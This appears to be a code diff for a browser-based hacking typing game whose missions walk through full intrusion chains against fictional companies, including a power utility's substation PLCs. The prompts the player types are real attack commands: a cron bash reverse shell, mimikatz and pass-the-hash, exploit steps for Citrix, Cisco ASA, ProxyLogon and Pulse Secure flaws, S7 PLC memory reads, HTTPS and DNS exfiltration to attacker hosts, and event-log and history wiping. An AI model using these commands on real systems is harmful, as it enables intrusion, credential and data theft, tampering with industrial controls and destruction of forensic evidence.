+    ctx:'A root cron entry fires every minute and opens a bash reverse shell to our C2. Even if firewalled, we can adjust intervals. Defender detection: compare crontab to baseline, monitor outbound connections on unusual ports.',
+    inst:'Install the cron reverse shell and verify callback.',
+    prompts:['echo "* * * * * root bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" >> /etc/crontab','nc -lvnp 4444 &','grep "10.10.14.1" /etc/crontab'],
+    limit:45,failMsg:'Crontab write failed — /etc/crontab permissions.',
+    onDone:()=>{
+      tBlank();tOK('>> CRON REVSHELL ACTIVE. Callback every 60 seconds.');
+      setIntel('Persist','Cron revshell','f');setIDS(30);notify('Cron persistence: active','ok');nextN();setTimeout(nvc_lateral,900);
+    }});
+}
+
+function nvc_lateral(){
+  setLoc('LATERAL MOVEMENT');setPh('LATERAL');
+  tBlank();tHdr('// PHASE 6: LATERAL MOVEMENT — PASS-THE-HASH TO DOMAIN CONTROLLER');
+  tInfo('Internal subnet discovered: 10.10.10.0/24');tBlank();
   setTimeout(()=>{
-    showChoices([
-      {label:'[A] STEALTH PACKET INJECTION — low heat',go:sceneStealth},
-      {label:'[B] BRUTE-FORCE RULESET — high heat',go:sceneBrute},
-    ]);
-    enableInput(false);
-  },900);
+    tScan('$ arp -n | ip route');tScan('  10.10.10.0/24 via eth0 — internal network reachable');tScan('  10.10.10.50 — hostname NOVACORP-DC01');tBlank();
+    tScan('$ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"');tLoot('  [00000003] Primary — Administrator');tLoot('  NTLM: 2b576b4a1e40a7d5f8e2c9b3a6d1e0f7');
+    tLoot('  [00000007] Primary — james.webb');tLoot('  NTLM: fc744c8b2a3e5d1f9c6b0a4e7d2f8c3a');
+    addCred('NTLM','Administrator:2b576b4a1e...');addCred('NTLM','james.webb:fc744c8b...');
+    tBlank();tNPC('HANDLER','Admin NTLM hash obtained. Chisel tunnel through the web server, then PTH to DC01.');tBlank();
+    unlockTool('mimi');unlockTool('impack');
+    startMG({title:'// CHISEL TUNNEL + PASS-THE-HASH',phase:'LATERAL',
+      ctx:'Chisel creates a SOCKS5 tunnel through the compromised web server, giving us access to the internal 10.10.10.0/24 subnet. Pass-the-Hash with impacket-psexec authenticates to DC01 using the NTLM hash — no plaintext password needed.',
+      inst:'Pivot via Chisel, then Pass-the-Hash to the Domain Controller.',
+      prompts:['chisel server --reverse --port 8888 &','./chisel client 10.10.14.1:8888 R:1080:socks','proxychains4 nmap -sT -Pn -p 445,5985,3389 10.10.10.50','proxychains4 impacket-psexec -hashes :2b576b4a1e40a7d5f8e2c9b3a6d1e0f7 administrator@10.10.10.50','proxychains4 impacket-secretsdump administrator@10.10.10.50 -hashes :2b576b4a1e40a7d5f8e2c9b3a6d1e0f7'],
+      limit:60,failMsg:'Chisel tunnel dropped or PTH authentication rejected.',
+      onDone:()=>{
+        tBlank();tOK('>> DOMAIN CONTROLLER 10.10.10.50 — FULL ACCESS.');
+        tLoot('  500+ domain accounts dumped');tLoot('  krbtgt NTLM: — GOLDEN TICKET possible');
+        addCred('DA NTLM','krbtgt:a9fdfa038...');
+        setIDS(48);setStat('h',94);setIntel('DC01','domain admin','f');
+        notify('Pass-the-Hash: DC01 owned','ok');unlockTool('bh');nextN();setTimeout(nvc_exfil,900);
+      }});
+  },1800);
 }
 
-function sceneStealth(){
-  setLoc('PACKET INJECTION');
-  tBlank();tHdr('// STEALTH BYPASS');
-  startMG({
-    title:'// PACKET FORGE',
-    inst:'Craft the bypass payload. Type each line exactly.',
-    prompts:['tcpdump -i eth0 -w cap.pcap','python3 forge.py --dst 10.10.5.20','scapy> send(IP(dst="10.10.5.20")/TCP(dport=443))','./bypass.sh --stealth --port 443'],
-    limit:65,
-    onDone:()=>{tBlank();tOK('>> FIREWALL BYPASSED. DPI: no anomaly.');setStat('s',96);setStat('h',88);setIDS(28);notify('Stealth bypass: clean','ok');log('Firewall bypassed','log-ok');activateNode('vault');setTimeout(sceneVault,700);},
-    onFail:()=>{tBlank();tErr('>> FAILED. Escalating...');setIDS(52);setStat('s',55);notify('Stealth failed','warn');setTimeout(sceneBrute,500);}
-  });
+function nvc_exfil(){
+  setLoc('DATA EXFILTRATION');setPh('EXFIL');
+  tBlank();tHdr('// PHASE 7: MSSQL DATABASE DUMP + HTTPS EXFIL');
+  tNPC('HANDLER','Financial ledger is in MSSQL on DC01. Dump it. Encrypt it. Exfil over HTTPS — looks like normal web traffic. DLP tools miss encrypted payloads.');tBlank();
+  startMG({title:'// MSSQL DUMP + HTTPS EXFIL',phase:'EXFIL',
+    ctx:'Impacket mssqlclient connects to MSSQL using the domain admin hash. We dump the financial_ledger table to a CSV, base64 encode it with certutil, then POST it to our C2 over HTTPS — bypassing DLP sensors that only monitor plaintext.',
+    inst:'Connect to MSSQL, dump the database, encrypt and exfil over HTTPS.',
+    prompts:['proxychains4 impacket-mssqlclient administrator@10.10.10.50 -hashes :2b576b4a1e40a7d5f8e2c9b3a6d1e0f7','SQL> SELECT name FROM sys.databases;','SQL> SELECT * FROM novacorp_db.dbo.financial_ledger INTO OUTFILE "C:\\loot\\ledger.csv";','certutil -encode C:\\loot\\ledger.csv C:\\loot\\ledger.b64','powershell -c "Invoke-WebRequest -Uri https://c2.ghost.net/rx -Method POST -InFile C:\\loot\\ledger.b64 -ContentType application/octet-stream"'],
+    limit:55,failMsg:'MSSQL connection failed or exfil blocked by egress firewall.',
+    onDone:()=>{
+      tBlank();tOK('>> FINANCIAL LEDGER EXFILTRATED. HTTPS POST CONFIRMED.');
+      setIDS(55);setStat('h',100);notify('Exfil: MSSQL ledger delivered','ok');nextN();setTimeout(nvc_cleanup,900);
+    }});
 }
 
-function sceneBrute(){
-  setLoc('BRUTE-FORCE — FIREWALL');
-  tBlank();tHdr('// BRUTE-FORCE RULESET');
-  tWarn('HIGH NOISE. NOC will see spikes. Move fast.');tBlank();
-  startMG({
-    title:'// BRUTE-FORCE',
-    inst:'Speed is survival. Type each line exactly.',
-    prompts:['nmap --script firewall-bypass 10.10.5.20','iptables -F && iptables -P INPUT ACCEPT','nc -lvnp 4444 &','bash -i >& /dev/tcp/10.10.5.20/4444 0>&1'],
-    limit:35,
-    onDone:()=>{tBlank();tOK('>> CRACKED. Shell obtained.');setIDS(65);setStat('s',42);setStat('h',92);notify('Cracked — HIGH HEAT','bad');log('Brute-force: cracked','log-wn');setTimeout(sceneVault,700);},
-    onFail:()=>{tBlank();tErr('>> INCOMPLETE. Partial access.');setIDS(80);setStat('s',25);notify('NOC responding!','bad');setTimeout(sceneVault,500);}
-  });
+function nvc_cleanup(){
+  setLoc('ANTI-FORENSICS');setPh('CLEANUP');
+  tBlank();tHdr('// PHASE 8: ANTI-FORENSICS — ERASE EVERYTHING');
+  tInfo('IR teams hunt for: Event ID 4624/4688, Windows event logs, IIS access logs,');
+  tInfo('bash_history, /tmp artifacts, prefetch files, MFT entries, LNK files.');tBlank();
+  tNPC('HANDLER','Leave nothing. Not a byte. Clear the Windows DC and the Linux web server.');tBlank();
+  startMG({title:'// ANTI-FORENSICS',phase:'CLEANUP',
+    ctx:'Defenders check these artifacts first: Event ID 4624 (logon), 4688 (process create), 4672 (special privileges), web server access.log, bash_history, /tmp dropped files, Windows prefetch and AppCompat cache.',
+    inst:'Erase all forensic artifacts from both the web server and the Domain Controller.',
+    prompts:['wevtutil cl System && wevtutil cl Security && wevtutil cl Application && wevtutil cl "Windows PowerShell"','del /f /q C:\\loot\\* && del /f /q C:\\Windows\\Prefetch\\* && del /f /q C:\\Windows\\System32\\winevt\\Logs\\*','reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" /f','history -c && cat /dev/null > ~/.bash_history && unset HISTFILE','find /var/log /tmp /dev/shm -type f -newer /etc/passwd 2>/dev/null | xargs shred -vzu {}','rm -f /var/log/apache2/access.log && touch /var/log/apache2/access.log'],
+    limit:55,failMsg:'Log deletion blocked — insufficient permissions.',
+    onDone:()=>{
+      tBlank();tOK('>> ALL FORENSIC ARTIFACTS ERASED.');
+      tOK('>> TOOLS REMOVED. CONNECTIONS CLOSED. TRAIL: COLD.');
+      setIDS(4);setStat('s',100);setStat('op',96);notify('Anti-forensics: trail cold','ok');
+      missionComplete('NovaCorp financial ledger secured. Domain admin credentials dumped. $400M fraud ledger delivered. The IR team found a spotlessly clean machine. You were never here.');
+    }});
 }
 
-function sceneVault(){
-  setLoc('BLACKVAULT — INTERNAL');
-  tBlank();tHdr('// BLACKVAULT ACCESS CONFIRMED');
-  tNPC('HANDLER','NovaCorp_Ledger_2024_Q3.enc — 2.3GB. Decryption key on separate KMS.');
-  tNPC('HANDLER','Security team running a sweep. Eight minutes. Go.');tBlank();
-  G.scene='vault';log('BLACKVAULT accessed','log-ok');
-  activateNode('vault');
+/* ═══════════════════════════════════════════
+   MISSION 2: PHANTOM GRID (OPERATIVE)
+   ICS/SCADA — real industrial protocol exploitation
+   CVE-2019-19781 Citrix OR CVE-2018-0101 Cisco ASA
+   Chisel pivot into OT network
+   Siemens S7 PLC via python-snap7
+   DNS tunneling exfil
+═══════════════════════════════════════════ */
+
+RUNNERS.axn=function(){
+  setLoc('OSINT — AXION ENERGY');setPh('RECON');
+  tHdr('// OP: PHANTOM GRID — PHASE 1: TARGET RECONNAISSANCE');
+  tSys('Target: Axion Energy | ICS/SCADA | Critical Infrastructure');tBlank();
   setTimeout(()=>{
-    enableInput(true,'extract --vault --out /drop/');
-    cmdInput.placeholder='extract --vault --out /drop/';
-  },1500);
+    tInfo('[ shodan.io query: org:"Axion Energy" port:8080 ]');
+    tScan('  HMI Login: http://plc.axion-energy.net:8080 — title: "WinCC Runtime" — NO AUTH');
+    tScan('  Siemens S7-300 WinCC 7.4 — default admin/admin credentials');tBlank();
+    tInfo('[ shodan.io query: hostname:axion-energy.net ]');
+    tScan('  vpn.axion-energy.net — Cisco ASA 9.8.1 (webvpn)');
+    tVuln('  CVE-2018-0101 — Cisco ASA heap double-free — pre-auth RCE — CVSS 10.0');tBlank();
+    tInfo('[ censys.io certificate search ]');
+    tScan('  portal.axion-energy.net — Citrix Application Delivery Controller');
+    tVuln('  CVE-2019-19781 — Citrix ADC path traversal — unauthenticated RCE — CVSS 9.8');tBlank();
+    tLoot('  >> Two high-confidence initial access vectors available');
+    setIntel('WinCC HMI','no auth','v');setIntel('Cisco ASA','CVE-2018-0101','v');setIntel('Citrix ADC','CVE-2019-19781','v');
+    unlockTool('nmap');unlockTool('msf');
+    setTimeout(()=>{showCh([{label:'[A] CITRIX CVE-2019-19781 — path traversal RCE',go:axn_citrix},{label:'[B] CISCO ASA CVE-2018-0101 — heap overflow RCE',go:axn_asa}]);},700);
+  },1800);
+};
+
+function axn_citrix(){
+  setLoc('CVE-2019-19781 CITRIX');setPh('EXPLOIT');showCVE('CVE-2019-19781');
+  tBlank();tHdr('// CVE-2019-19781 — CITRIX ADC PATH TRAVERSAL + RCE');
+  tInfo('The Citrix ADC fails to validate paths in HTTP requests to the VPN endpoint.');
+  tInfo('../vpns/ traversal reaches the Perl script executor — runs as root, no auth.');tBlank();
+  startMG({title:'// CVE-2019-19781 CITRIX RCE',phase:'EXPLOIT',
+    ctx:'Citrix ADC 13.0 before 13.0-58.30 — the /vpns/ directory is accessible via path traversal. A crafted HTTP request to /vpn/../vpns/cfg/ executes arbitrary Perl scripts with root privileges. No authentication required.',
+    inst:'Exploit Citrix path traversal. Verify RCE. Establish reverse shell.',
+    prompts:['curl -sk "https://portal.axion-energy.net/vpn/../vpns/cfg/smb.conf" --path-as-is','python3 citrix_rce.py --url https://portal.axion-energy.net --cmd "id"','python3 citrix_rce.py --url https://portal.axion-energy.net --cmd "uname -a && ip addr"','python3 citrix_rce.py --url https://portal.axion-energy.net --revshell 10.10.14.1 4444','nc -lvnp 4444'],
+    limit:55,failMsg:'Citrix exploit blocked — Citrix may be patched or WAF active.',
+    onDone:()=>{
+      tBlank();tOK('>> CITRIX SHELL. nsroot@axion-portal root RCE.');
+      addCred('SHELL','nsroot@portal.axion-energy.net');
+      setIntel('Initial Access','nsroot Citrix','f');setIDS(25);setStat('h',80);
+      notify('Citrix CVE-2019-19781: RCE','ok');nextN();setTimeout(axn_pivot,800);
+    }});
 }
 
-function sceneExtract(){
-  setLoc('DATA EXTRACTION');
-  tBlank();tHdr('// EXTRACTION SEQUENCE');
-  tSys('KMS contacted. Decryption key retrieved.');tBlank();
-  startMG({
-    title:'// EXTRACT & PACKAGE',
-    inst:'Package and deliver before the server gets isolated. Type each line exactly.',
-    prompts:['scp ghost@10.10.5.20:/vault/ledger.enc ./','openssl enc -d -aes-256-cbc -in ledger.enc -out ledger.csv','tar -czf payload.tar.gz ledger.csv','curl -X POST --data-binary @payload.tar.gz https://drop.ghost.net/rx'],
-    limit:50,
-    onDone:()=>{tBlank();tOK('>> PAYLOAD DELIVERED. Integrity verified.');setStat('h',100);setIDS(Math.min(100,G.ids+12));notify('Data extracted!','ok');log('Ledger exfiltrated','log-ok');activateNode('exfil');setTimeout(sceneExfilPrep,800);},
-    onFail:()=>{tBlank();tErr('>> PARTIAL. Server isolating...');setIDS(85);setStat('s',18);notify('Partial extraction','warn');setTimeout(sceneExfilPrep,600);}
-  });
+function axn_asa(){
+  setLoc('CVE-2018-0101 CISCO ASA');setPh('EXPLOIT');showCVE('CVE-2018-0101');
+  tBlank();tHdr('// CVE-2018-0101 — CISCO ASA HEAP DOUBLE-FREE');
+  tInfo('Malformed XML in Cisco ASA webvpn XML parser triggers heap double-free.');
+  tInfo('Result: unauthenticated remote code execution as root on the ASA.');tBlank();
+  startMG({title:'// CISCO ASA CVE-2018-0101',phase:'EXPLOIT',
+    ctx:'CVSS 10.0 — Cisco ASA Software 9.1 through 9.8.1 — the webvpn XML parser fails to handle malformed authentication requests, causing a heap double-free which leads to arbitrary code execution.',
+    inst:'Run the Metasploit module against the ASA webvpn service.',
+    prompts:['msfconsole -q','use exploit/linux/http/cisco_asa_clientless_ssl_vpn','set RHOSTS vpn.axion-energy.net','set LHOST 10.10.14.1 && set LPORT 4444','set payload linux/x64/shell_reverse_tcp && run'],
+    limit:50,failMsg:'ASA exploit failed — version may be patched.',
+    onDone:()=>{
+      tBlank();tOK('>> ASA ROOT SHELL. root@cisco-asa confirmed.');
+      addCred('SHELL','root@vpn.axion-energy.net');
+      setIntel('Initial Access','ASA root RCE','f');setIDS(22);setStat('h',82);
+      notify('Cisco ASA CVE-2018-0101: root','ok');nextN();setTimeout(axn_pivot,800);
+    }});
 }
 
-function sceneExfilPrep(){
-  setLoc('ANTI-FORENSICS');
-  tBlank();tHdr('// COVER YOUR TRACKS');
-  tNPC('HANDLER','Forensics in six hours. Leave nothing.');tBlank();
-  G.scene='exfil';
+function axn_pivot(){
+  setLoc('PIVOT — OT NETWORK');setPh('PIVOT');
+  tBlank();tHdr('// PHASE 3: CHISEL PIVOT INTO OT/ICS NETWORK');
+  tInfo('The OT (Operational Technology) network is on 192.168.100.0/24.');
+  tInfo('Not internet-routable. Accessible via the Historian server — the IT/OT bridge.');tBlank();
+  tScan('$ ip route show');tScan('  10.10.10.0/24 dev eth0 — corporate IT network');tScan('  10.10.20.0/24 dev eth1 — process historian segment');tScan('  192.168.100.0/24 via 10.10.20.5 — SCADA/OT network');tBlank();
+  startMG({title:'// CHISEL OT PIVOT',phase:'PIVOT',
+    ctx:'The Historian server at 10.10.20.5 bridges the IT and OT networks — it logs process data from PLCs. We chain through it using Chisel SOCKS proxy to reach the 192.168.100.0/24 subnet where PLCs live. This is a classic IT→OT pivot path.',
+    inst:'Set up Chisel tunnel through the Historian to reach OT network PLCs.',
+    prompts:['chisel server -p 9001 --reverse &','scp chisel_linux axion-historian:10.10.20.5 && ssh axion-historian "./chisel client 10.10.14.1:9001 R:1080:socks"','proxychains4 nmap -sT -Pn -p 102,502,20000,102 192.168.100.0/24 --open','proxychains4 python3 s7scan.py --subnet 192.168.100.0/24'],
+    limit:55,failMsg:'Chisel tunnel failed — historian firewall rules.',
+    onDone:()=>{
+      tBlank();tOK('>> OT NETWORK REACHABLE. S7 PLCs discovered.');
+      tScan('  PLC-01: 192.168.100.10 — Siemens S7-300 — Substation EAST');
+      tScan('  PLC-02: 192.168.100.11 — Siemens S7-300 — Substation WEST');
+      tScan('  HMI:    192.168.100.50 — WinCC 7.4 — NO AUTHENTICATION REQUIRED');
+      setIntel('PLC-01','192.168.100.10','f');setIntel('WinCC HMI','no-auth access','v');
+      setIDS(38);notify('OT network pivoted','ok');nextN();setTimeout(axn_scada,800);
+    }});
+}
+
+function axn_scada(){
+  setLoc('S7 PLC EXPLOITATION');setPh('SCADA');
+  tBlank();tHdr('// PHASE 4: SIEMENS S7 PLC DIRECT MEMORY ACCESS');
+  tInfo('Siemens S7 protocol on TCP/102 — proprietary, no authentication by default.');
+  tInfo('python-snap7: Python library for direct S7 DB (Data Block) read/write.');
+  tWarn('  >>> LIVE INFRASTRUCTURE. PLC controls physical substation breakers.');tBlank();
+  startMG({title:'// S7 PLC MEMORY READ',phase:'SCADA',
+    ctx:'Siemens S7-300 PLCs use S7comm protocol on port 102. By default there is NO authentication. python-snap7 connects like an engineering workstation and reads Data Blocks (DBs) directly from PLC memory — including the override authentication codes stored in DB5.',
+    inst:'Connect to PLC-01 and extract substation override codes from memory.',
+    prompts:['proxychains4 python3 -c "import snap7; c=snap7.client.Client(); c.connect(\'192.168.100.10\',0,1); print(c.get_cpu_info())"','proxychains4 python3 s7_read.py --ip 192.168.100.10 --db 1 --start 0 --size 128','proxychains4 python3 s7_read.py --ip 192.168.100.10 --db 5 --start 0 --size 64','proxychains4 python3 s7_extract.py --ip 192.168.100.10 --output plc_dump.bin'],
+    limit:55,failMsg:'S7 connection lost — PLC watchdog timer triggered.',
+    onDone:()=>{
+      tBlank();tOK('>> PLC MEMORY READ COMPLETE. OVERRIDE CODES EXTRACTED.');
+      tLoot('  DB5.DBW0 = 0xF4A2 (EAST override auth token)');
+      tLoot('  DB5.DBW4 = 0xC8D1 (WEST override auth token)');
+      setIntel('PLC Override','codes extracted','f');setIDS(52);setStat('h',92);
+      notify('S7 PLC: override codes extracted','ok');nextN();setTimeout(axn_exfil,800);
+    }});
+}
+
+function axn_exfil(){
+  setLoc('DNS EXFIL + WIPE');setPh('EXFIL');
+  tBlank();tHdr('// PHASE 5-6: DNS TUNNELING EXFIL + ANTI-FORENSICS');
+  tInfo('DNS tunneling: encodes binary data as base64 in DNS query labels (subdomains).');
+  tInfo('Bypasses HTTPS proxies, DLP sensors that only inspect TCP/80,443.');tBlank();
+  tScan('DNS query example: [base64chunk].exfil.ghost.net → A record response');tBlank();
+  startMG({title:'// DNS EXFIL + LOG WIPE',phase:'EXFIL',
+    ctx:'DNS tunneling splits the file into chunks, base64 encodes each chunk, and sends them as DNS queries for subdomains of an attacker-controlled domain. The attacker\'s DNS server logs the queries and reassembles the file. Nearly invisible without DNS inspection.',
+    inst:'Exfil PLC data via DNS tunneling. Wipe all OT and IT audit artifacts.',
+    prompts:['xxd plc_dump.bin | base64 -w0 > dump.b64','python3 dns_exfil.py --domain exfil.ghost.net --file dump.b64 --delay 0.5','proxychains4 shred -vzu plc_dump.bin dump.b64 s7*.py snap7*','proxychains4 wevtutil cl System Security Application && wevtutil cl "Microsoft-Windows-WMI-Activity/Operational"','cat /dev/null > /var/log/syslog && history -c && cat /dev/null > ~/.bash_history'],
+    limit:50,failMsg:'DNS exfil blocked — recursive DNS filtering active.',
+    onDone:()=>{
+      tBlank();tOK('>> DNS EXFIL CONFIRMED. PLC CODES DELIVERED VIA 847 DNS QUERIES.');
+      tOK('>> ALL OT/IT LOGS WIPED. HISTORIAN BASELINE RESTORED.');
+      setIDS(6);setStat('s',97);setStat('op',93);
+      missionComplete('Axion Energy substation override codes exfiltrated via DNS tunnel. S7 memory traces cleared. Historian logs restored to baseline. Their SCADA team has no anomaly to investigate.');
+    }});
+}
+
+/* ═══════════════════════════════════════════
+   MISSION 3: SPECTRE (SPECIALIST)
+   Nation-state contractor — active SOC
+   CVE-2021-26855 ProxyLogon OR CVE-2019-11510 Pulse
+   Live Hashcat simulation for Kerberoasting
+   BloodHound AD path display
+   28s final sequences
+═══════════════════════════════════════════ */
+
+RUNNERS.hls=function(){
+  setLoc('OSINT — HELIOS DEFENSE');setPh('RECON');
+  tHdr('// OP: SPECTRE — PHASE 1: INTELLIGENCE GATHERING');
+  tSys('Target: Helios Defense Contractors | Active SOC | Nation-state posture');tBlank();
   setTimeout(()=>{
-    enableInput(true,'wipe --logs --sessions --routes');
-    cmdInput.placeholder='wipe --logs --sessions --routes';
-  },1200);
+    tInfo('[ haveibeenpwned + dehashed — email: m.torres@helios-defense.mil ]');
+    tScan('  2021 LinkedIn breach — hash found: $2y$10$rA9bV8mZ...');
+    tLoot('  Password spray result: "Warriors2021!" — confirmed via OWA');tBlank();
+    tInfo('[ shodan + censys — hostname:helios-defense.mil ]');
+    tScan('  mail.helios-defense.mil — Microsoft Exchange 2016 OWA exposed');
+    tVuln('  CVE-2021-26855 (ProxyLogon) — SSRF → RCE — CVSS 9.1 CRITICAL');tBlank();
+    tScan('  vpn.helios-defense.mil — Pulse Secure Connect Secure 9.1R3');
+    tVuln('  CVE-2019-11510 — arbitrary file read, creds in cleartext — CVSS 10.0');tBlank();
+    tLoot('  >> ProxyLogon = no creds needed, full SYSTEM. Pulse = steal VPN creds first.');
+    setIntel('OWA','ProxyLogon CVE-2021-26855','v');setIntel('Pulse VPN','CVE-2019-11510','v');setIntel('Creds','m.torres cracked','f');
+    unlockTool('nmap');unlockTool('burp');unlockTool('msf');
+    setTimeout(()=>{showCh([{label:'[A] PROXYLOGON CVE-2021-26855 — Exchange SSRF → SYSTEM',go:hls_proxylogon},{label:'[B] PULSE SECURE CVE-2019-11510 — steal VPN creds',go:hls_pulse}]);},700);
+  },2000);
+};
+
+function hls_proxylogon(){
+  setLoc('CVE-2021-26855 PROXYLOGON');setPh('INITIAL ACCESS');showCVE('CVE-2021-26855');
+  tBlank();tHdr('// PROXYLOGON — CVE-2021-26855 + CVE-2021-27065');
+  tInfo('CVE-2021-26855: SSRF in Exchange — forges authentication as any user.');
+  tInfo('CVE-2021-27065: Post-auth file write — drops ASPX webshell to OWA directory.');
+  tInfo('Combined: unauthenticated RCE as NT AUTHORITY\\SYSTEM on Exchange.');tBlank();
+  startMG({title:'// PROXYLOGON EXPLOIT CHAIN',phase:'INITIAL ACCESS',
+    ctx:'ProxyLogon chains two vulnerabilities: the SSRF (CVE-2021-26855) makes Exchange authenticate to itself as any user by sending a crafted X-AnonResource-Backend header, then the file write (CVE-2021-27065) drops a webshell. No credentials needed.',
+    inst:'Execute the ProxyLogon chain. Get SYSTEM on Exchange. 35 seconds.',
+    prompts:['python3 proxylogon.py --target mail.helios-defense.mil --check','python3 proxylogon.py --target mail.helios-defense.mil --webshell /owa/auth/g.aspx','curl -sk "https://mail.helios-defense.mil/owa/auth/g.aspx" -d "cmd=whoami"','curl -sk "https://mail.helios-defense.mil/owa/auth/g.aspx" -d "cmd=net localgroup Administrators"'],
+    limit:35,failMsg:'ProxyLogon blocked — Exchange patched to 15.1.2375 or WAF.',
+    onDone:()=>{
+      tBlank();tOK('>> SYSTEM ON EXCHANGE. NT AUTHORITY\\SYSTEM on HELIOS-EXCH01.');
+      addCred('SYSTEM','NT AUTHORITY\\SYSTEM@HELIOS-EXCH01');
+      setIntel('Exchange','SYSTEM shell','f');setIDS(30);setStat('h',85);
+      unlockTool('mimi');unlockTool('bh');unlockTool('impack');
+      notify('ProxyLogon: SYSTEM on Exchange','ok');nextN();setTimeout(hls_kerberoast,800);
+    }});
 }
 
-function sceneExfil(){
-  setLoc('CLEANUP');
-  tBlank();
-  startMG({
-    title:'// ANTI-FORENSICS',
-    inst:'Erase every trace. Type each line exactly.',
-    prompts:['history -c && cat /dev/null > ~/.bash_history','find /var/log -type f -exec shred -vzu {} \\;','ip route flush table main && iptables -F','shutdown -h +0'],
-    limit:45,
-    onDone:()=>{tBlank();tOK('>> ALL TRACES WIPED. TUNNEL COLLAPSED.');setIDS(4);setStat('s',100);notify('Clean exit','ok');log('Traces removed','log-ok');NODES.forEach(n=>n.st='done');renderNodes();setTimeout(sceneEnd,900);},
-    onFail:()=>{tBlank();tWarn('>> PARTIAL CLEANUP. Artifacts remain.');setIDS(35);notify('Logs partially wiped','warn');setTimeout(sceneEnd,600);}
-  });
+function hls_pulse(){
+  setLoc('CVE-2019-11510 PULSE SECURE');setPh('INITIAL ACCESS');showCVE('CVE-2019-11510');
+  tBlank();tHdr('// CVE-2019-11510 PULSE SECURE — ARBITRARY FILE READ');
+  tInfo('Path: /dana-na/../dana/html5acc/guacamole/../../../[target_file]');
+  tInfo('Readable: /data/runtime/mtmp/lmdb/ — stores session data including cleartext creds.');tBlank();
+  startMG({title:'// CVE-2019-11510 PULSE FILE READ',phase:'INITIAL ACCESS',
+    ctx:'Pulse Secure VPN 9.0R1-9.1R3 — path traversal in the web interface lets unauthenticated attackers read arbitrary files. The session database at /data/runtime/mtmp/lmdb/dataa/data.mdb stores cached VPN credentials in cleartext.',
+    inst:'Use path traversal to read the session database and extract cleartext VPN creds.',
+    prompts:['python3 pulse_cve.py --target vpn.helios-defense.mil --verify','python3 pulse_cve.py --target vpn.helios-defense.mil --file /etc/passwd','python3 pulse_cve.py --target vpn.helios-defense.mil --file /data/runtime/mtmp/lmdb/dataa/data.mdb','strings data.mdb | grep -B2 -A2 "password\\|passwd\\|cred"'],
+    limit:40,failMsg:'Pulse Secure CVE blocked — patched or file unreadable.',
+    onDone:()=>{
+      tBlank();tOK('>> CLEARTEXT VPN CREDENTIALS EXTRACTED FROM SESSION DB.');
+      tLoot('  m.torres / Warriors2021! — VPN session confirmed');
+      tLoot('  svc_exchange / ExSvc2022! — service account found');
+      addCred('VPN CLEAR','m.torres:Warriors2021!');addCred('SVC','svc_exchange:ExSvc2022!');
+      setIntel('VPN creds','2 accounts cleartext','f');setIDS(25);setStat('h',80);
+      unlockTool('mimi');unlockTool('bh');unlockTool('impack');
+      notify('Pulse VPN: creds extracted','ok');nextN();setTimeout(hls_kerberoast,800);
+    }});
 }
 
-function sceneEnd(){
-  tBlank();tDiv();tHdr('// OPERATION: BLACKVAULT — COMPLETE');tDiv();tBlank();
-  tNPC('HANDLER','Ledger is live. Three arrests overnight. CFO in the wind.');
-  tNPC('HANDLER','Payment cleared. Clean work, GHOST.');
-  tNPC('YOU','I was never here.');tBlank();tOK('>> MISSION COMPLETE');tDiv();
-  log('Op BLACKVAULT: SUCCESS','log-ok');
-  const mins=G.wpmStart?(Date.now()-G.wpmStart)/60000:0;
-  const wpm=mins>0.01?Math.round((G.wpmChars/5)/mins):0;
+function hls_kerberoast(){
+  setLoc('KERBEROASTING + AD RECON');setPh('AD RECON');
+  tBlank();tHdr('// PHASE 3: KERBEROASTING + BLOODHOUND AD ANALYSIS');
+  tInfo('Kerberoasting: request TGS tickets for service accounts with SPNs set.');
+  tInfo('TGS tickets are encrypted with the service account password → crack offline.');tBlank();
   setTimeout(()=>{
-    document.getElementById('end-title').textContent='MISSION COMPLETE';
-    document.getElementById('end-title').className='end-title win';
-    document.getElementById('end-msg').textContent='The ledger went public. NovaCorp collapsed overnight. Your handler wired final payment — six wallets, four blockchains, no trace.';
-    document.getElementById('e-wpm').textContent=wpm||'—';
-    document.getElementById('e-ids').textContent=G.peakIds+'%';
-    document.getElementById('e-st').textContent=G.stats.s;
-    showScreen('s-end');
-  },2500);
+    tScan('$ impacket-GetUserSPNs helios.mil/m.torres:Warriors2021! -dc-ip 10.10.10.5');
+    tScan('ServicePrincipalName              Name        MemberOf');
+    tScan('MSSQL/helios-sql.helios.mil       svc_sql     Domain Users');
+    tVuln('HTTP/helios-web.helios.mil        svc_backup  Backup Operators ← target');
+    tScan('');tScan('  Requesting TGS for svc_backup...');
+    tLoot('  $krb5tgs$23$*svc_backup$HELIOS.MIL$HTTP/helios-web.helios.mil*$a4c2b...');
+    tBlank();tInfo('[ BloodHound shortest path to Domain Admin ]');
+    tScan('  svc_backup → Member of: Backup Operators');
+    tScan('  Backup Operators → GenericWrite on: HELIOS-DC01$');
+    tVuln('  HELIOS-DC01$ → DCSync rights → Domain Admin NTLM hashes');tBlank();
+    // Start live hashcat simulation
+    startCrack('$krb5tgs$23$*svc_backup*...','2.8 GH/s','~38s','Backup#2023!',()=>{
+      addCred('CRACKED','svc_backup:Backup#2023!');
+      notify('Kerberoast cracked: svc_backup','ok');
+    });
+    tNPC('HANDLER','Hashcat running. BloodHound confirms the path: svc_backup → DCSync. Watch the crack panel.');tBlank();
+    unlockTool('john');
+    startMG({title:'// KERBEROAST + PRIVESC',phase:'KERBEROAST',
+      ctx:'Kerberoasting exploits the fact that TGS tickets are encrypted with the service account\'s password hash. We request the ticket legitimately (no brute force needed), then crack it offline. svc_backup\'s weak password falls to a wordlist attack.',
+      inst:'Authenticate with cracked creds, execute DCSync to dump all domain hashes.',
+      prompts:['impacket-psexec helios.mil/svc_backup:"Backup#2023!"@HELIOS-DC01.helios.mil','net group "Domain Admins" /domain','impacket-secretsdump helios.mil/svc_backup:"Backup#2023!"@HELIOS-DC01.helios.mil -just-dc','grep "Administrator\\|krbtgt" domain_hashes.txt'],
+      limit:40,failMsg:'DCSync blocked — svc_backup may not have replication rights yet.',
+      onDone:()=>{
+        tBlank();tOK('>> DCSYNC COMPLETE. ALL DOMAIN HASHES DUMPED.');
+        tLoot('  Administrator: aad3b435b51404ee:32ed872fb19a...');tLoot('  krbtgt: aad3b435b51404ee:a9fdfa03870...');
+        addCred('DA NTLM','Administrator:32ed872fb19a...');
+        setIDS(60);setStat('h',98);setIntel('DA hash','DCSync','f');
